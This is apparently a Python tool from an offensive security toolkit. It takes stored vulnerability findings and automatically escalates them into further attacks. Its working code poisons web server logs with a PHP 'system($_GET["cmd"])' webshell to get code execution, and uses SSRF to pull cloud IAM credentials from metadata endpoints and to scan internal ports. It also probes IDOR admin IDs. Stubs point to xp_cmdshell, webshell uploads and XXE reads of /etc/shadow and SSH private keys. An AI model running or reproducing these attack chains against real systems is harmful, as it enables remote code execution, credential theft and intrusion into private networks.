import json, os, sqlite3, sys, subprocess, urllib.request, urllib.error

DB = os.path.expanduser("~/.noir/findings.db")

CHAINS = [
    {
        "name": "lfi_log_poison_rce",
        "trigger": "path_traversal",
        "label": "LFI → Log Poisoning → RCE",
        "desc": "If LFI found on PHP, try log poisoning to get RCE",
        "check": lambda f: "php" in f.get("endpoint", "").lower() or "php" in f.get("evidence", "").lower(),
        "run": "try_log_poison",
    },
    {
        "name": "ssrf_cloud_meta",
        "trigger": "ssrf",
        "label": "SSRF → Cloud Metadata",
        "desc": "Try cloud metadata endpoints (AWS/GCP/Azure) for credential extraction",
        "check": lambda f: True,
        "run": "try_cloud_meta",
    },
    {
        "name": "sqli_xp_cmdshell",
        "trigger": "sqli",
        "label": "SQLi → xp_cmdshell RCE",
        "desc": "If SQLi on MSSQL, try xp_cmdshell for OS command execution",
        "check": lambda f: "mssql" in f.get("endpoint", "").lower() or "microsoft sql" in f.get("evidence", "").lower(),
        "run": "try_xp_cmdshell",
    },
    {
        "name": "sqli_into_webshell",
        "trigger": "sqli",
        "label": "SQLi → Webshell via INTO OUTFILE",
        "desc": "Write PHP webshell via MySQL INTO OUTFILE",
        "check": lambda f: "mysql" in f.get("evidence", "").lower() or "php" in f.get("endpoint", "").lower(),
        "run": "try_into_outfile",
    },
    {
        "name": "file_upload_webshell",
        "trigger": "file_upload",
        "label": "File Upload → Webshell RCE",
        "desc": "If file upload found without validation, deploy webshell",
        "check": lambda f: True,
        "run": "try_upload_webshell",
    },
    {
        "name": "xxe_file_read",
        "trigger": "xxe",
        "label": "XXE → File Read",
        "desc": "Use XXE to read sensitive files beyond what was detected",
        "check": lambda f: True,
        "run": "try_xxe_deeper",
    },
    {
        "name": "idor_priv_esc",
        "trigger": "idor",
        "label": "IDOR → Privilege Escalation",
        "desc": "Use IDOR primitive to access admin-level resources",
        "check": lambda f: True,
        "run": "try_idor_escalate",
    },
    {
        "name": "ssrf_internal_pivot",
        "trigger": "ssrf",
        "label": "SSRF → Internal Port Scan",
        "desc": "Use SSRF to probe internal network services",
        "check": lambda f: True,
        "run": "try_internal_pivot",
    },
]

def get_conn():
    conn = sqlite3.connect(DB)
    conn.row_factory = sqlite3.Row
    return conn

def get_finding(fid):
    conn = get_conn()
    return conn.execute("SELECT * FROM findings WHERE id=?", (fid,)).fetchone()

def get_open_findings(vuln_type=None):
    conn = get_conn()
    if vuln_type:
        return conn.execute("SELECT * FROM findings WHERE vuln_type=? AND status='open'", (vuln_type,)).fetchall()
    return conn.execute("SELECT * FROM findings WHERE status='open' ORDER BY cvss DESC").fetchall()

def save_chain_result(finding_id, chain_name, result):
    conn = get_conn()
    conn.execute("""
        CREATE TABLE IF NOT EXISTS chains (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            finding_id INTEGER NOT NULL,
            chain_name TEXT NOT NULL,
            result TEXT,
            output TEXT DEFAULT '',
            created_at TEXT DEFAULT (datetime('now')),
            FOREIGN KEY(finding_id) REFERENCES findings(id)
        )
    """)
    conn.execute("INSERT INTO chains (finding_id, chain_name, result, output) VALUES (?, ?, ?, ?)",
                 (finding_id, chain_name, result["status"], result.get("output", "")))
    conn.commit()
    cid = conn.lastrowid
    if result["status"] == "exploited":
        conn.execute("INSERT INTO findings (target, vuln_type, endpoint, payload, severity, poc, evidence) VALUES (?, ?, ?, ?, ?, ?, ?)",
                     (result.get("target", ""), f"chain:{chain_name}", result.get("endpoint", ""),
                      result.get("payload", ""), result.get("severity", "high"),
                      result.get("poc", ""), result.get("evidence", "")))
        conn.commit()
        print(f"  → chained finding saved (id={conn.lastrowid})")
    return cid

def try_log_poison(f):
    base = f["endpoint"].rsplit("?", 1)[0] if "?" in f["endpoint"] else f["endpoint"]
    for log_path in ["/var/log/apache2/access.log", "/var/log/nginx/access.log", "/var/log/httpd/access_log"]:
        for param in ["file", "page", "include", "path", "template", "load"]:
            url = f"{base}?{param}={log_path}"
            try:
                r = urllib.request.urlopen(urllib.request.Request(url), timeout=10)
                body = r.read().decode("utf-8", errors="replace")
                if "GET" in body or "POST" in body:
                    php_code = '<?php system($_GET["cmd"]); ?>'
                    poison_url = f"{base}?{param}={urllib.request.quote(log_path + php_code)}"
                    return {"status": "exploited", "target": f["target"], "endpoint": url,
                            "payload": f"LFI via {param} → log poison", "severity": "critical",
                            "poc": f"curl '{poison_url}'\ncurl '{base}?{param}={log_path}&cmd=id'",
                            "evidence": f"log readable at {log_path}"}
            except:
                pass
    return {"status": "failed", "output": "no writable log found"}

def try_cloud_meta(f):
    base = f["endpoint"].rsplit("?", 1)[0] if "?" in f["endpoint"] else f["endpoint"]
    param = None
    for p in ["url", "target", "dest", "redirect", "file", "page", "image", "load"]:
        if p in f.get("payload", ""):
            param = p
            break
    if not param:
        param = "url"
    endpoints = [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/project/?recursive=true",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    ]
    for meta_url in endpoints:
        url = f"{base}?{param}={meta_url}"
        try:
            req = urllib.request.Request(url)
            if "google" in meta_url:
                req.add_header("Metadata-Flavor", "Google")
            r = urllib.request.urlopen(req, timeout=10)
            body = r.read().decode("utf-8", errors="replace")
            if body.strip() and len(body) > 20:
                return {"status": "exploited", "target": f["target"], "endpoint": url,
                        "payload": f"SSRF → cloud metadata at {meta_url}",
                        "severity": "critical",
                        "poc": f"curl '{url}'",
                        "evidence": body[:2000]}
        except:
            pass
    return {"status": "failed", "output": "no cloud metadata accessible"}

def try_xp_cmdshell(f):
    return {"status": "pending", "output": "requires manual sqlmap --os-shell on MSSQL endpoint"}

def try_into_outfile(f):
    return {"status": "pending", "output": "requires mysql write path + sqlmap --file-write"}

def try_upload_webshell(f):
    return {"status": "pending", "output": "deploy php/jsp webshell at upload endpoint"}

def try_xxe_deeper(f):
    return {"status": "pending", "output": "try /etc/shadow, /root/.ssh/id_rsa via OOB XXE"}

def try_idor_escalate(f):
    base = f["endpoint"].rsplit("/", 1)[0]
    for admin_id in ["admin", "0", "1", "9999"]:
        url = f"{base}/{admin_id}"
        try:
            r = urllib.request.urlopen(urllib.request.Request(url), timeout=10)
            if r.getcode() == 200:
                body = r.read().decode("utf-8", errors="replace")
                if len(body) > 50:
                    return {"status": "exploited", "target": f["target"], "endpoint": url,
                            "payload": f"IDOR escalation to id={admin_id}",
                            "severity": "high",
                            "poc": f"curl '{url}'",
                            "evidence": f"HTTP 200, {len(body)} bytes"}
        except:
            pass
    return {"status": "failed", "output": "no escalation found"}

def try_internal_pivot(f):
    base = f["endpoint"].rsplit("?", 1)[0] if "?" in f["endpoint"] else f["endpoint"]
    param = None
    for p in ["url", "target", "dest", "redirect"]:
        if p in f.get("payload", ""):
            param = p
            break
    if not param:
        param = "url"
    for port in [22, 80, 443, 3306, 6379, 27017, 5432, 8080, 9200]:
        for scheme in ["http", "https"]:
            url = f"{base}?{param}={scheme}://127.0.0.1:{port}"
            try:
                r = urllib.request.urlopen(urllib.request.Request(url), timeout=5)
                body = r.read().decode("utf-8", errors="replace")
                if body.strip():
                    return {"status": "exploited", "target": f["target"], "endpoint": url,
                            "payload": f"SSRF internal pivot → 127.0.0.1:{port}",
                            "severity": "high",
                            "poc": f"curl '{url}'",
                            "evidence": f"127.0.0.1:{port} returned {len(body)} bytes"}
            except:
                pass
    return {"status": "failed", "output": "no internal services reachable"}

def cmd_scan(args):
    findings = get_open_findings()
    if not findings:
        print("no open findings to chain")
        return
    print(f"scanning {len(findings)} open findings for chain opportunities...")
    for f in findings:
        vt = f["vuln_type"]
        for chain in CHAINS:
            if chain["trigger"] in vt and chain["check"](f):
                print(f"  #{f['id']} {f['target']} {vt} → [{chain['label']}]")

def cmd_run(args):
    fid = int(args[0])
    f = get_finding(fid)
    if not f:
        print(f"finding #{fid} not found")
        sys.exit(1)
    vt = f["vuln_type"]
    print(f"finding #{fid}: {f['target']} - {vt}")
    matched = False
    for chain in CHAINS:
        if chain["trigger"] in vt and chain["check"](f):
            matched = True
            print(f"  chain: {chain['label']}")
            handler = globals().get(chain["run"])
            if handler:
                result = handler(f)
                save_chain_result(fid, chain["name"], result)
                print(f"  result: {result['status']}")
                if result.get("output"):
                    print(f"  output: {result['output']}")
    if not matched:
        print("  no chain matches this finding")

def cmd_list(args):
    conn = get_conn()
    rows = conn.execute("SELECT * FROM chains ORDER BY created_at DESC LIMIT 20").fetchall()
    if not rows:
        print("no chain results yet")
        return
    print(f"Chain results:")
    for r in rows:
        print(f"  #{r['id']:3d} finding #{r['finding_id']:3d} {r['chain_name']:30s} {r['result']:12s} [{r.get('created_at','')[:19]}]")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python tools/chainer.py <scan|run|list> [args]")
        print("  scan                     — scan all open findings for chain opportunities")
        print("  run <finding_id>         — execute chains for a specific finding")
        print("  list                     — show chain results")
        sys.exit(1)
    cmd = sys.argv[1]
    args = sys.argv[2:]
    {"scan": cmd_scan, "run": cmd_run, "list": cmd_list}.get(cmd, lambda _: print(f"Unknown: {cmd}"))(args)